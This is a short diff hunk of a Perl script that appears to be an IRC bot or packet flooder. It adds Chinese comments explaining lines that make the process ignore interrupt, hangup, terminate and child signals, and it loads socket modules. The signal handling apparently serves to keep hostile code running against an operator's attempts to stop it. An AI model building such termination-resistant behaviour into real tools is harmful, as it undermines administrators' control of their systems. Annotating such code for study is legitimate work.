@@ -151,11 +151,11 @@ my $pacotes = 1;
 ##### [ Stop Editing if you dont know what are you doing. ] #####
 #################################################################
 
-$SIG{'INT'} = 'IGNORE';
-$SIG{'HUP'} = 'IGNORE';
-$SIG{'TERM'} = 'IGNORE';
-$SIG{'CHLD'} = 'IGNORE';
-$SIG{'PS'} = 'IGNORE';
+$SIG{'INT'} = 'IGNORE';                                                                                                  #忽略來自鍵盤的中斷
+$SIG{'HUP'} = 'IGNORE';                                                                                                  #忽略終端掛起或者控制進程終止
+$SIG{'TERM'} = 'IGNORE';                                                                                                 #忽略終端信號
+$SIG{'CHLD'} = 'IGNORE';                                                                                                 #忽略子進程終止
+$SIG{'PS'} = 'IGNORE';                                                                                                   
 
 use Socket;
 use IO::Socket;
